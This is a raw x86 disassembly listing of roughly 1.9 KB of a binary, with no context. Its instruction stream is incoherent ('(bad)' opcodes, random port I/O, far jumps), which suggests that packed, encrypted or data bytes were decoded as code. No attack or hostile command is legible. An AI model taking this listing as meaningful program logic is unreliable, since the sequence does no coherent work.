  41789d:	in     al,0x71
  41789f:	repz xchg edi,eax
  4178a1:	inc    edx
  4178a2:	mov    ah,0x24
  4178a4:	add    DWORD PTR [edx+eiz*4],edi
  4178a7:	cmp    esi,ecx
  4178a9:	(bad)  
  4178ab:	and    BYTE PTR [edi-0x3c8856a9],al
  4178b1:	loopne 0x4178e5
  4178b3:	neg    edi
  4178b5:	or     eax,0xb5b8eb6c
  4178ba:	rol    DWORD PTR [eax-0x250e8943],cl
  4178c0:	sbb    eax,DWORD PTR [edx-0x231dad87]
  4178c6:	pop    ss
  4178c7:	mov    edi,0x32cd5dc
  4178cc:	aas    
  4178cd:	push   esp
  4178ce:	or     eax,0x13f7be29
  4178d3:	iret   
  4178d4:	push   0xffffffd3
  4178d6:	cmp    al,0x7f
  4178d8:	xlat   BYTE PTR ds:[ebx]
  4178d9:	les    esi,FWORD PTR [eax]
  4178db:	in     al,dx
  4178dc:	add    esp,DWORD PTR [edx+0x3e]
  4178df:	cli    
  4178e0:	gs mov eax,0x915b66f0
  4178e6:	icebp  
  4178e7:	push   ds
  4178e8:	inc    ebp
  4178e9:	jge    0x417938
  4178eb:	leave  
  4178ec:	pop    es
  4178ed:	xor    ecx,DWORD PTR [esi]
  4178ef:	ja     0x4178cc
  4178f1:	aam    0xf6
  4178f3:	xor    DWORD PTR [eax-0x77],esi
  4178f6:	inc    edi
  4178f7:	outs   dx,DWORD PTR ds:[esi]
  4178f8:	mov    dl,0x5d
  4178fa:	test   eax,0x9d84dcf9
  4178ff:	cmp    al,0x3f
  417901:	mov    cl,0x6
  417903:	mov    cl,bh
  417905:	mov    WORD PTR [esi+0x7c9787c0],?
  41790b:	cmp    edi,DWORD PTR [ebx+0x27]
  41790e:	mov    esp,0x90c12ae4
  417913:	dec    edi
  417914:	in     eax,0xcd
  417916:	fsubr  QWORD PTR [ecx]
  417918:	fmul   QWORD PTR es:[eax-0x4d]
  41791c:	xchg   edx,eax
  41791d:	cmp    al,0xe6
  41791f:	adc    eax,0xaaa7ea12
  417924:	cdq    
  417925:	cmp    eax,0xb870b103
  41792a:	in     al,dx
  41792b:	test   al,bh
  41792d:	pop    es
  41792e:	inc    ebp
  41792f:	fidivr WORD PTR [esi]
  417931:	xor    DWORD PTR [eax-0x2c],esp
  417934:	add    eax,0x8bd50df9
  417939:	jle    0x417909
  41793b:	sub    al,0xbb
  41793d:	aas    
  41793e:	in     eax,0xa8
  417940:	or     DWORD PTR [ebp-0x66e75f29],esi
  417946:	outs   dx,BYTE PTR ds:[esi]
  417947:	call   0xb456:0x14475c16
  41794e:	test   bl,0x8f
  417951:	imul   ebx,DWORD PTR [edi],0x11a29337
  417957:	icebp  
  417958:	fcom   QWORD PTR [ecx-0x2a7ac1fa]
  41795e:	sbb    esi,DWORD PTR [ecx+0x5d51e73a]
  417964:	ror    BYTE PTR [esi+esi*4],1
  417967:	sub    DWORD PTR [ebp-0x7d],eax
  41796a:	adc    ah,BYTE PTR [esi-0x50]
  41796d:	pop    ebp
  41796e:	iret   
  41796f:	sbb    eax,0xf4fd5079
  417974:	sbb    BYTE PTR [ebx-0x7de9fc14],cl
  41797a:	je     0x417952
  41797c:	sahf   
  41797d:	dec    ecx
  41797e:	sbb    edx,DWORD PTR ds:0xbff58416
  417984:	inc    BYTE PTR [ecx+0x1346942]
  41798a:	dec    al
  41798c:	or     eax,0xa7c1852d
  417991:	fnstcw WORD PTR [ebp+0x1eca70e3]
  417997:	pop    edi
  417998:	xchg   edi,eax
  417999:	ja     0x41793f
  41799b:	xor    ch,cl
  41799d:	test   bl,0xd2
  4179a0:	pop    edx
  4179a1:	and    BYTE PTR [ebp+ecx*4-0x43de1afe],ch
  4179a8:	pusha  
  4179a9:	and    ebx,eax
  4179ab:	mov    edi,0x6d3723d2
  4179b0:	jl     0x417992
  4179b2:	push   eax
  4179b3:	(bad)  
  4179b4:	mov    esp,0x9cf13ac7
  4179b9:	jno    0x41797d
  4179bb:	pop    edx
  4179bc:	add    al,0xb8
  4179be:	fdiv   QWORD PTR [ebx]
  4179c0:	sbb    esi,DWORD PTR [edx]
  4179c2:	mov    ecx,0xf18835ed
  4179c7:	fucomp st(0)
  4179c9:	cmp    eax,0xc44503a8
  4179ce:	out    dx,eax
  4179cf:	ins    DWORD PTR es:[edi],dx
  4179d0:	cmp    DWORD PTR [edi+0x77f8289c],ebx
  4179d6:	sti    
  4179d7:	mov    edx,DWORD PTR [esi+0x18c0c20b]
  4179dd:	mov    eax,ds:0xf512b51
  4179e2:	ret    0xe7fc
  4179e5:	test   DWORD PTR [eax+0x10],edi
  4179e8:	xchg   esp,eax
  4179e9:	cmovg  esp,DWORD PTR [ecx+0x27569fe]
  4179f0:	popf   
  4179f1:	ss or  ah,dh
  4179f4:	adc    dh,BYTE PTR [ecx-0x1c]
  4179f7:	sbb    edx,ebx
  4179f9:	push   edi
  4179fa:	push   0xffffff93
  4179fc:	xchg   ecx,eax
  4179fd:	test   al,0x3
  4179ff:	sub    DWORD PTR [edx],ebx
  417a01:	(bad)  
  417a02:	ret    
  417a03:	xchg   edx,eax
  417a04:	scas   al,BYTE PTR es:[edi]
  417a05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a06:	xchg   ebx,eax
  417a07:	punpcklbw mm1,DWORD PTR [eax+0x5204e289]
  417a0e:	nop
  417a0f:	jb     0x4179ef
  417a11:	cld    
  417a12:	and    ah,dh
  417a14:	in     al,dx
  417a15:	popa   
  417a16:	xor    eax,0xd4760b9e
  417a1b:	push   ds
  417a1c:	fs dec ebx
  417a1e:	out    dx,eax
  417a1f:	cli    
  417a20:	sbb    eax,0x53dad203
  417a26:	(bad)  
  417a27:	repnz sar DWORD PTR [ebx+0x4d0a9483],0x1c
  417a2f:	dec    eax
  417a30:	cld    
  417a31:	add    edx,edx
  417a33:	dec    esi
  417a34:	sar    eax,0x26
  417a37:	stos   BYTE PTR es:[edi],al
  417a38:	cmc    
  417a39:	jo     0x417a0d
  417a3b:	popa   
  417a3c:	in     al,dx
  417a3d:	xor    BYTE PTR [ebx-0x45c72434],ch
  417a43:	leave  
  417a44:	mov    bl,0x63
  417a46:	xchg   ebp,eax
  417a47:	imul   edi,DWORD PTR [ebx+0x6a33b0da],0xe87edd14
  417a51:	adc    BYTE PTR [ecx-0x3c3533f8],bl
  417a57:	das    
  417a58:	ror    dl,0x1b
  417a5b:	shr    BYTE PTR [ebp+0x57],cl
  417a5e:	jno    0x417aac
  417a60:	add    al,0xf2
  417a62:	cli    
  417a63:	sbb    dl,dh
  417a65:	inc    ebx
  417a66:	mov    ds,WORD PTR ds:0x8db5dbea
  417a6c:	aas    
  417a6d:	out    0xeb,al
  417a6f:	add    BYTE PTR [ecx],ch
  417a71:	shr    DWORD PTR [eax-0x183f7cff],cl
  417a77:	xor    dl,BYTE PTR [edi+0x511357f5]
  417a7d:	outs   dx,DWORD PTR ds:[esi]
  417a7e:	mov    ds:0x50c9be0b,eax
  417a83:	int3   
  417a84:	ins    BYTE PTR es:[edi],dx
  417a85:	dec    esp
  417a86:	cmp    eax,0x6b08fe8e
  417a8b:	dec    ebp
  417a8c:	push   ebp
  417a8d:	cli    
  417a8e:	push   esi
  417a8f:	out    0x69,eax
  417a91:	and    eax,0x75deb96d
  417a96:	xchg   ecx,eax
  417a97:	mov    ecx,0xe728d5c0
  417a9c:	mov    eax,0xed96e7ba
  417aa1:	loopne 0x417a7a
  417aa3:	pop    es
  417aa4:	retf   0x63a4
  417aa7:	pop    ss
  417aa8:	jg     0x417a97
  417aaa:	push   ebp
  417aab:	adc    DWORD PTR [edi],ebx
  417aad:	jns    0x417ab0
  417aaf:	daa    
  417ab0:	adc    esp,ebp
  417ab2:	xlat   BYTE PTR ds:[ebx]
  417ab3:	mov    ch,0x3d
  417ab5:	ret    0x97a3
  417ab8:	adc    DWORD PTR [ebp+ebx*2+0x44],ebp
  417abc:	pop    ds
  417abd:	cmc    
  417abe:	xchg   edx,eax
  417abf:	mov    edi,0x1de73765
  417ac4:	add    dh,BYTE PTR [esi+0xa]
  417ac7:	pop    esi
  417ac8:	sub    eax,0x4d1f211
  417acd:	mov    esi,esi
  417acf:	and    eax,0xa2353e94
  417ad4:	mov    ebx,0x657dd4f3
  417ad9:	je     0x417a85
  417adb:	test   BYTE PTR [eax+0x55e4ba4c],bh
  417ae1:	lahf   
  417ae2:	push   esi
  417ae3:	pusha  
  417ae4:	add    eax,0xea79d14
  417ae9:	push   ss
  417aea:	int3   
  417aeb:	out    0x6e,eax
  417aed:	retf   
  417aee:	push   0x980b571
  417af3:	lahf   
  417af4:	imul   edx,esi,0xdfbf6977
  417afa:	ins    DWORD PTR es:[edi],dx
  417afb:	pop    es
  417afc:	and    DWORD PTR [ecx-0x2c],ebx
  417aff:	iret   
  417b00:	xor    BYTE PTR [esi+0x36b0742f],bh
  417b06:	nop
  417b07:	push   cs
  417b08:	xchg   ecx,eax
  417b09:	shl    esp,1
  417b0b:	mov    al,ds:0x15a2b02d
  417b10:	jecxz  0x417b75
  417b12:	xchg   edx,eax
  417b13:	inc    edi
  417b14:	imul   edi,DWORD PTR [di+0x13],0xffffffb9
  417b19:	lea    ebp,[ebx-0x7e]
  417b1c:	out    dx,eax
  417b1d:	sbb    al,0x99
  417b1f:	xlat   BYTE PTR ds:[ebx]
  417b20:	dec    esp
  417b21:	imul   esp,DWORD PTR [edx],0xeb904f8d
  417b27:	sbb    eax,0x949ed354
  417b2c:	je     0x417b58
  417b2e:	cld    
  417b2f:	(bad)  
  417b30:	jmp    0x417b48
  417b32:	add    eax,DWORD PTR [edi-0x19eab1f1]
  417b38:	int    0x1c
  417b3a:	or     BYTE PTR [ebx],dh
  417b3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b3d:	loop   0x417b9d
  417b3f:	mov    bh,0x2f
  417b41:	pushf  
  417b42:	pushf  
  417b43:	repz pop ebx
  417b45:	xchg   edx,eax
  417b46:	leave  
  417b47:	cmp    eax,0xbf41c20e
  417b4c:	push   0x3d873aec
  417b51:	ss inc eax
  417b53:	add    BYTE PTR [edx-0x25bbb036],dl
  417b59:	jl     0x417b37
  417b5b:	scas   al,BYTE PTR es:[edi]
  417b5c:	leave  
  417b5d:	mov    ch,0xd5
  417b5f:	pop    ebx
  417b60:	ins    BYTE PTR es:[edi],dx
  417b61:	mov    edi,esi
  417b63:	pusha  
  417b64:	stc    
  417b65:	push   ebx
  417b66:	bound  esp,QWORD PTR [ebx]
  417b68:	or     bh,al
  417b6a:	push   cs
  417b6b:	in     eax,dx
  417b6c:	sub    eax,0x164426f1
  417b71:	inc    edx
  417b72:	(bad)  
  417b73:	or     edi,DWORD PTR [ebx-0x28731196]
  417b79:	xchg   DWORD PTR [ebx+0x1b24905d],ebp
  417b7f:	lods   al,BYTE PTR ds:[esi]
  417b80:	fsub   QWORD PTR ds:0x1e6f250f
  417b86:	jp     0x417b4a
  417b88:	push   ebp
  417b89:	ror    BYTE PTR [ebx-0x14],0xb1
  417b8d:	jmp    0x417b9d
  417b8f:	cmp    DWORD PTR [ebp-0x1a],0xaebf5b9f
  417b96:	cmp    BYTE PTR [eax-0x41],al
  417b99:	(bad)  
  417b9b:	cdq    
  417b9c:	ss push ds
  417b9e:	add    DWORD PTR [ecx-0x2a86be13],esi
  417ba4:	sbb    DWORD PTR [edi-0xf],eax
  417ba7:	hlt    
  417ba8:	std    
  417ba9:	adc    bh,cl
  417bab:	mov    bh,0x55
  417bad:	push   ebp
  417bae:	rcl    DWORD PTR [ebx-0xde95413],0x24
  417bb5:	cs repz test eax,0xa4993b07
  417bbc:	cmp    eax,0xa408f6a4
  417bc1:	ds loope 0x417b48
  417bc4:	push   edi
  417bc5:	fcom   st(7)
  417bc7:	inc    eax
  417bc8:	sub    eax,0x211c06bf
  417bcd:	int3   
  417bce:	and    BYTE PTR [ecx],ch
  417bd0:	data16 mov ax,0xaf3b
  417bd5:	push   ss
  417bd6:	outs   dx,BYTE PTR ds:[esi]
  417bd7:	popa   
  417bd8:	scas   eax,DWORD PTR es:[edi]
  417bd9:	xchg   ebx,eax
  417bda:	xchg   edi,eax
  417bdb:	jne    0x417bff
  417bdd:	push   ebx
  417bde:	fldcw  WORD PTR [ebx+0x2e]
  417be1:	adc    eax,0x1b1385a1
  417be6:	add    BYTE PTR [esi-0x3147438],0x82
  417bed:	ret    
  417bee:	lds    edi,FWORD PTR [ecx+0x3d]
  417bf1:	cwde   
  417bf2:	iret   
  417bf3:	inc    esp
  417bf4:	les    esi,FWORD PTR [eax]
  417bf6:	ret    0x5704
  417bf9:	(bad)  
  417bfb:	jae    0x417c69
  417bfd:	loop   0x417bca
  417bff:	mov    eax,?
  417c01:	retf   
  417c02:	inc    esp
  417c03:	lods   eax,DWORD PTR ds:[esi]
  417c04:	ret    
  417c05:	push   ds
  417c06:	les    edx,FWORD PTR [esi-0x53a9774c]
  417c0c:	or     eax,0x1bdba9e1
  417c11:	imul   ecx,DWORD PTR [edi-0x2700f8f2],0xf8c1a4c5
  417c1b:	mov    ch,0xa7
  417c1d:	test   DWORD PTR [edx],esp
  417c1f:	sti    
  417c20:	into   
  417c21:	push   cs
  417c22:	jmp    0x3bf6b680
  417c27:	iret   
  417c28:	clc    
  417c29:	daa    
  417c2a:	pop    esp
  417c2b:	lods   eax,DWORD PTR ds:[esi]
  417c2c:	xchg   edx,eax
  417c2d:	jnp    0x417c98
  417c2f:	jmp    0x417bed
  417c31:	push   ecx
  417c32:	ret    0x21ed
  417c35:	mov    ecx,0xfd3dcc62
  417c3a:	mov    bl,0x96
  417c3c:	mov    eax,ds:0xaeed28e7
  417c41:	mov    dh,0x45
  417c43:	repz xlat BYTE PTR ds:[ebx]
  417c45:	popa   
  417c46:	adc    ah,BYTE PTR [edi]
  417c48:	pop    es
  417c49:	inc    eax
  417c4a:	cmp    al,0x81
  417c4c:	ret    
  417c4d:	les    ecx,FWORD PTR ds:0xffe99d3e
  417c53:	aaa    
  417c54:	mov    cs,WORD PTR [edi-0x212e0dde]
  417c5a:	pop    eax
  417c5b:	test   eax,0x1d75ef9
  417c60:	rcr    DWORD PTR [edi],cl
  417c62:	fstp   QWORD PTR [ebx+0x2e0034a4]
  417c68:	dec    ecx
  417c69:	add    bh,0xfe
  417c6c:	out    0x3,al
  417c6e:	add    al,0x3f
  417c70:	xchg   ecx,eax
  417c71:	push   esp
  417c72:	inc    edx
  417c73:	or     eax,0x46d45e63
  417c78:	jo     0x417cd8
  417c7a:	repnz jecxz 0x417c40
  417c7d:	jg     0x417cab
  417c7f:	adc    BYTE PTR [eax-0x28],dl
  417c82:	lods   al,BYTE PTR ds:[esi]
  417c83:	mov    bh,0xe1
  417c85:	jmp    0x417c76
  417c87:	jns    0x417c24
  417c89:	in     eax,dx
  417c8a:	jmp    0x4fde6819
  417c8f:	js     0x417c86
  417c91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c92:	xchg   esi,eax
  417c93:	scas   al,BYTE PTR es:[edi]
  417c94:	pop    edx
  417c95:	sub    DWORD PTR [ecx+0x7a],0x8f45d3ef
  417c9c:	pop    ss
  417c9d:	jp     0x417cb0
  417c9f:	mov    cl,0xa6
  417ca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ca2:	pop    esi
  417ca3:	loope  0x417c62
  417ca5:	fisubr DWORD PTR [esi]
  417ca7:	pusha  
  417ca8:	push   edx
  417ca9:	cli    
  417caa:	daa    
  417cab:	ret    0x1be2
  417cae:	(bad)  
  417caf:	push   eax
  417cb0:	test   cl,cl
  417cb2:	adc    al,ah
  417cb4:	lods   al,BYTE PTR ds:[esi]
  417cb5:	(bad)  
  417cb6:	mov    ecx,0x8a3b1b05
  417cbb:	cmp    ecx,edx
  417cbd:	push   ds
  417cbe:	stos   DWORD PTR es:[edi],eax
  417cbf:	nop
  417cc0:	jae    0x417c47
  417cc2:	out    0xbb,al
  417cc4:	or     ebx,DWORD PTR [eax]
  417cc6:	hlt    
  417cc7:	into   
  417cc8:	cmp    al,0xc
  417cca:	nop
  417ccb:	mov    eax,0x1722815
  417cd0:	ss fs jb 0x417d3f
  417cd4:	xchg   esp,eax
  417cd5:	mov    bh,0x6b
  417cd7:	cmp    ch,BYTE PTR [eax+0x4d080f84]
  417cdd:	repz popa 
  417cdf:	dec    ebx
  417ce0:	aad    0x6a
  417ce2:	add    al,BYTE PTR fs:[ebx-0x6c]
  417ce6:	fcom   QWORD PTR [edx+0x1c]
  417ce9:	fs jg  0x417d5e
  417cec:	cmp    DWORD PTR [eax+ebx*1],0xc62cf006
  417cf3:	jmp    0x417c99
  417cf5:	fs mov eax,fs
  417cf8:	clc    
  417cf9:	dec    ecx
  417cfa:	fsub   DWORD PTR [ebp+0x3e]
  417cfd:	mov    ds:0x279343c,al
  417d02:	mul    DWORD PTR [edi-0x3c]
  417d05:	loope  0x417cba
  417d07:	in     eax,0xf7
  417d09:	aad    0xda
  417d0b:	mov    edx,0xc9927f12
  417d10:	mov    ds:0x6b316e75,al
  417d15:	loopne 0x417ca7
  417d17:	xchg   esp,eax
  417d18:	enter  0x44d1,0x2f
  417d1c:	cmp    al,0x78
  417d1e:	imul   BYTE PTR ds:0x9f5d9be8
  417d24:	jle    0x417cde
  417d26:	addr16 inc ebp
  417d28:	nop
  417d29:	cmp    ecx,DWORD PTR [edi+esi*1+0x4915db2f]
  417d30:	fcomip st,st(3)
  417d32:	dec    ebp
  417d33:	mov    ah,0xcd
  417d35:	xchg   ebx,eax
  417d36:	jle    0x417d15
  417d38:	adc    al,0xda
  417d3a:	imul   eax,edx,0xffffffe2
  417d3d:	sbb    al,0x36
  417d3f:	leave  
  417d40:	fs into 
  417d42:	add    al,ah
  417d44:	mov    ebx,0xff07b366
  417d49:	fldpi  
  417d4b:	je     0x417ced
  417d4d:	dec    eax
  417d4e:	nop
  417d4f:	in     al,dx
  417d50:	or     esp,edx
  417d52:	xchg   edx,eax
  417d53:	aad    0x87
  417d55:	loope  0x417d58
  417d57:	nop
  417d58:	fldz   
  417d5a:	arpl   ax,bx
  417d5c:	cmp    eax,0xab4acfa1
  417d61:	es mov ch,0x5e
  417d64:	and    BYTE PTR [ebx],dl
  417d66:	add    edx,DWORD PTR [esi-0x4f]
  417d69:	lahf   
  417d6a:	xlat   BYTE PTR ds:[ebx]
  417d6b:	ins    BYTE PTR es:[edi],dx
  417d6c:	test   eax,0xc0474d9c
  417d71:	(bad)  
  417d72:	les    ebp,FWORD PTR [eax-0x28a0a9a]
  417d78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d79:	imul   edx,DWORD PTR [ebx+0x26],0x32
  417d7d:	jae    0x417da0
  417d7f:	out    0x98,eax
  417d81:	jns    0x417d4f
  417d83:	cs mov esi,0x5694981c
  417d89:	add    BYTE PTR [ecx-0x1a],0x7a
  417d8d:	adc    BYTE PTR [esi-0x79],cl
  417d90:	bound  ebx,QWORD PTR [edx+eiz*2]
  417d93:	inc    ecx
  417d94:	repnz pop ds
  417d96:	outs   dx,DWORD PTR ds:[esi]
  417d97:	out    0x5a,eax
  417d99:	jnp    0x417e0c
  417d9b:	add    ah,ch
  417d9d:	in     eax,dx
  417d9e:	outs   dx,DWORD PTR ds:[esi]
  417d9f:	aas    
  417da0:	xchg   BYTE PTR [edi-0x3f],dl
  417da3:	test   al,0x7
  417da5:	lods   al,BYTE PTR ds:[esi]
  417da6:	ins    DWORD PTR es:[edi],dx
  417da7:	shr    DWORD PTR [esi+0x23],cl
  417daa:	imul   edx,DWORD PTR [ebx],0xfffffffd
  417dad:	or     BYTE PTR [ebx],bl
  417daf:	leave  
  417db0:	sub    bl,BYTE PTR [esi]
  417db2:	push   ebx
  417db3:	test   ax,0x5f28
  417db7:	and    ebx,DWORD PTR [edi+ebx*2-0x14]
  417dbb:	jecxz  0x417d6a
  417dbd:	dec    edi
  417dbe:	outs   dx,BYTE PTR ds:[esi]
  417dbf:	sbb    ebp,0x99b465f
  417dc5:	outs   dx,DWORD PTR ds:[esi]
  417dc6:	and    al,0x9f
  417dc8:	inc    ebp
  417dc9:	out    dx,al
  417dca:	cli    
  417dcb:	adc    eax,0x281d516a
  417dd0:	push   esi
  417dd1:	stos   BYTE PTR es:[edi],al
  417dd2:	jmp    0x417e20
  417dd4:	sub    ecx,edx
  417dd6:	xchg   edi,eax
  417dd7:	dec    DWORD PTR [edx-0x53]
  417dda:	mov    ds:0xc5034127,eax
  417ddf:	adc    al,0xa4
  417de1:	(bad)  
  417de2:	scas   al,BYTE PTR es:[edi]
  417de3:	int3   
  417de4:	xchg   ebp,eax
  417de5:	ret    
  417de6:	daa    
  417de7:	rol    ah,cl
  417de9:	adc    DWORD PTR [eax+0x1d10bba9],esi
  417def:	ja     0x417e05
  417df1:	push   ecx
  417df2:	pop    ebx
  417df3:	cwde   
  417df4:	cmp    BYTE PTR [edx+0x71e4b8ce],ah
  417dfa:	inc    ebx
  417dfb:	dec    edi
  417dfc:	pushf  
  417dfd:	add    esi,DWORD PTR [ebp-0x6]
  417e00:	or     eax,0xd1179bd7
  417e05:	sahf   
  417e06:	or     DWORD PTR [edx-0x4c],eax
  417e09:	cmp    ebx,DWORD PTR [edx+eax*1-0x3b]
  417e0d:	sub    al,0xab
  417e0f:	enter  0x3d11,0x60
  417e13:	push   ecx
  417e14:	sar    BYTE PTR [edi],cl
  417e16:	ss jbe 0x417e50
  417e19:	pop    edx
  417e1a:	mov    ds:0xf8547c23,al
  417e1f:	and    ch,BYTE PTR [edi]
  417e21:	sub    ecx,DWORD PTR [edi]
  417e23:	popf   
  417e24:	sbb    DWORD PTR [eax-0x33],ebx
  417e27:	lahf   
  417e28:	mov    ecx,0x4d8b9041
  417e2d:	loopne 0x417db9
  417e2f:	mov    WORD PTR ds:0xffffff5c,cs
  417e35:	mov    edx,DWORD PTR [ebp+0xc]
  417e38:	cmp    cl,BYTE PTR [edx]
  417e3a:	jne    0x420de3
  417e40:	mov    ecx,DWORD PTR [ebp-0x14]
  417e43:	mov    edx,DWORD PTR [ebp+0xc]
  417e46:	movsx  edx,BYTE PTR [edx]
  417e49:	xor    ecx,eax
  417e4b:	add    ecx,esi
  417e4d:	jmp    0x41a1da
  417e52:	cmp    DWORD PTR [ecx],ecx
  417e54:	mov    ebp,0x79c6ad42
  417e59:	stc    
  417e5a:	mov    DWORD PTR [ebp-0x58],edi
  417e5d:	fld    DWORD PTR [edx-0x13]
  417e60:	mov    ch,0xf3
  417e62:	fidivr WORD PTR [eax]
  417e64:	jge    0x417ee0
  417e66:	or     bl,BYTE PTR [edi+0x7a]
  417e69:	jp     0x417e40
  417e6b:	cld    
  417e6c:	push   0x57cc5c2c
  417e71:	add    BYTE PTR [ecx-0x6521be29],bl
  417e77:	add    ecx,esi
  417e79:	inc    esp
  417e7a:	iret   
  417e7b:	daa    
  417e7c:	jmp    0x618a66fa
  417e81:	retf   
  417e82:	pop    edi
  417e83:	imul   edx,DWORD PTR [ecx+ecx*4-0x68b1681d],0x61
  417e8b:	push   es
  417e8c:	test   eax,0x1502a025
  417e91:	in     eax,dx
  417e92:	and    edi,DWORD PTR [ecx+0x29f0bca7]
  417e98:	xlat   BYTE PTR ds:[ebx]
  417e99:	shl    DWORD PTR [edi-0x1752b6c],0x5d
  417ea0:	inc    esi
  417ea1:	ds push ebp
  417ea3:	jp     0x417eb6
  417ea5:	jmp    0xe36a:0x13ee045b
  417eac:	jmp    0x6988:0xc1926073
  417eb3:	fs push esi
  417eb5:	cmp    eax,0x93a6c818
  417eba:	add    eax,0x5e0ed568
  417ebf:	hlt    
  417ec0:	xor    ebp,DWORD PTR [eax]
  417ec2:	push   ds
  417ec3:	mov    ecx,0x3981ab07
  417ec8:	lea    eax,[eax]
  417eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ecb:	mov    esp,0x6cc036d
  417ed0:	call   0xc185:0x1cd7623
  417ed7:	and    al,0xc9
  417ed9:	stos   DWORD PTR es:[edi],eax
  417eda:	repz cmp al,0x40
  417edd:	stc    
  417ede:	sbb    BYTE PTR [ebx-0x5d],dl
  417ee1:	dec    ebx
  417ee2:	aas    
  417ee3:	loopne 0x417f3a
  417ee5:	ja     0x417e90
  417ee7:	pop    eax
  417ee8:	push   edx
  417ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eea:	scas   al,BYTE PTR es:[edi]
  417eeb:	dec    esp
  417eec:	in     al,dx
  417eed:	mov    eax,0xf62e119
  417ef2:	cli    
  417ef3:	xor    al,0x72
  417ef5:	daa    
  417ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ef7:	jnp    0x417f17
  417ef9:	inc    edi
  417efa:	mov    cl,0x31
  417efc:	jp     0x417f0c
  417efe:	in     al,dx
  417eff:	mov    bl,BYTE PTR [edx-0x59]
  417f02:	jnp    0x417efd
  417f04:	xchg   BYTE PTR [ebx-0x25],al
  417f07:	dec    ebx
  417f08:	pop    ebx
  417f09:	inc    eax
  417f0a:	mov    bh,0x93
  417f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f0d:	jbe    0x417edb
  417f0f:	arpl   WORD PTR [edx],si
  417f11:	mov    ah,0x76
  417f13:	jo     0x417f4b
  417f15:	dec    ebx
  417f16:	adc    ch,BYTE PTR [edx]
  417f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f19:	repz add eax,0x26d84b89
  417f1f:	rcr    DWORD PTR [ebx+0x32],cl
  417f22:	mov    WORD PTR [ecx-0x69],es
  417f25:	pop    ds
  417f26:	or     DWORD PTR [eax+0x45dd0fd1],ebx
  417f2c:	(bad)  
  417f2d:	sbb    ecx,edi
  417f2f:	push   esi
  417f30:	pop    esi
  417f31:	(bad)  
  417f32:	nop
  417f33:	jl     0x417f97
  417f35:	push   eax
  417f36:	ja     0x417eed
  417f38:	popf   
  417f39:	out    0x83,eax
  417f3b:	test   esi,edx
  417f3d:	les    ebp,FWORD PTR [ecx+ebx*2-0x567af3b4]
  417f44:	adc    DWORD PTR ds:0x1f7759ad,esi
  417f4a:	ins    DWORD PTR es:[edi],dx
  417f4b:	push   eax
  417f4c:	fimul  WORD PTR [ebx]
  417f4e:	jno    0x417f2d
  417f50:	mov    eax,0x70980424
  417f55:	sub    eax,0x16923a4c
  417f5a:	mov    ds:0x329dce78,al
  417f5f:	shr    BYTE PTR [ebx],1
  417f61:	jl     0x417ee7
  417f63:	push   cs
  417f64:	inc    edx
  417f65:	inc    ebp
  417f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f67:	jl     0x417fcd
  417f69:	stos   DWORD PTR es:[edi],eax
  417f6a:	loop   0x417f92
  417f6c:	xor    dh,BYTE PTR [esi+0x3157ab2b]
  417f72:	xchg   esi,eax
  417f73:	mov    eax,0xbc454c7
  417f78:	lahf   
  417f79:	mov    eax,ds:0x8a478606
  417f7e:	push   es
  417f7f:	inc    eax
  417f80:	fidivr WORD PTR [ecx-0x66]
  417f83:	push   ecx
  417f84:	gs cs pop esp
  417f87:	push   ecx
  417f88:	push   ebp
  417f89:	push   ebp
  417f8a:	stos   BYTE PTR es:[edi],al
  417f8b:	push   0xf
  417f8d:	or     al,0xc1
  417f8f:	aas    
  417f90:	push   gs
  417f92:	bound  edx,QWORD PTR ds:0x2b781d07
  417f98:	dec    ebx
  417f99:	nop
  417f9a:	jg     0x417fd0
  417f9c:	dec    edi
  417f9d:	mov    edi,0x5db22d0b
  417fa2:	arpl   WORD PTR [edi],bx
  417fa4:	push   ebx
  417fa5:	push   esp
  417fa6:	and    esi,DWORD PTR ds:0x38956dc6
  417fac:	mov    ds:0xbd5a349a,al
  417fb1:	aas    
  417fb2:	rol    DWORD PTR [esi],0x3a
  417fb5:	sbb    bh,BYTE PTR [edi]
  417fb7:	loopne 0x417ff5
  417fb9:	(bad)  
  417fba:	or     BYTE PTR [edx+0x4249408],bl
  417fc0:	adc    DWORD PTR ds:0x1dbbfeaa,ebx
  417fc6:	dec    edx
  417fc7:	jns    0x417fbb
  417fc9:	dec    ecx
  417fca:	mov    cl,0x3c
  417fcc:	(bad)  [ebx+0x56]
  417fcf:	xchg   DWORD PTR [edx+0x12a36c54],ebx
  417fd5:	push   0xfffffffb
  417fd7:	push   eax
  417fd8:	mov    esi,0x9bc31a1
  417fdd:	(bad)  
  417fde:	fimul  WORD PTR [ebp+eax*1+0x3c]
  417fe2:	cs dec esp
  417fe4:	outs   dx,DWORD PTR ds:[esi]
  417fe5:	ja     0x417fc8
  417fe7:	cmp    eax,0x13cd14f3
  417fec:	scas   eax,DWORD PTR es:[edi]
  417fed:	mov    bh,BYTE PTR [edx]
  417fef:	rcl    esi,0xc0
  417ff2:	(bad)
  417ff5:	inc    edx
  417ff6:	inc    eax
  417ff7:	ds or  eax,0x4f952910
  417ffd:	jmp    0xf94c:0x8f932e3b
  418004:	cmp    BYTE PTR [eax+0x6],0x82
  418008:	jle    0x418003
  41800a:	scas   eax,DWORD PTR es:[edi]
  41800b:	es jae 0x418083
  41800e:	dec    ecx
  41800f:	rol    BYTE PTR [ecx+0x1f],cl
  418012:	nop
  418013:	test   al,0x9d
  418015:	and    BYTE PTR [edx+0x3d48ec1],al
  41801b:	aaa    
  41801c:	in     eax,dx
  41801d:	ret    
  41801e:	es push ebx
  418020:	out    dx,eax
  418021:	sbb    edx,ebx
  418023:	pop    eax
  418024:	mov    bl,0x60
  418026:	fisttp QWORD PTR [edi-0x7ef6146f]
  41802c:	rcl    ch,0x7a
  41802f:	jb     0x418074
  418031:	xchg   edx,eax
  418032:	sbb    eax,0xeab4cc2d
  418037:	mov    ah,0x3a
  418039:	and    BYTE PTR ds:[ebx-0x2c],0xa1
